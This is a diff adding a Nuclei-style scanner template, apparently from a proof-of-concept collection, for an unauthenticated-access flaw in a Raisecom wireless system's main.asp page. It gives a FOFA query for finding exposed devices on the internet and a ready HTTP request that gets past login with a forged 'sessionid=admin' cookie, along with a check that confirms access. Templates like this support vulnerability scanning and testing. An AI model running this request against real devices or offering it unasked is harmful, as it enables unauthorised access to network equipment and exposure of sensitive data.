@@ -1,0 +1,28 @@
+id: raisecom-wireless-mainasp-unauthorized
+
+info:
+  name: "瑞斯康达wireless系统main.asp接口未授权访问"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: banner="Server: INP httpd" || header="Server: INP httpd"
+      瑞斯康达wireless系统main.asp接口存在未授权访问漏洞，攻击者可通过远程调用该接口获取敏感信息。
+  tags: 瑞斯康达
+
+http:
+- raw:
+  - |
+    GET /main.asp HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Cookie: sessionid=admin
+    Accept-Encoding: gzip, deflate
+    X-Requested-With: XMLHttpRequest
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'summary.asp'
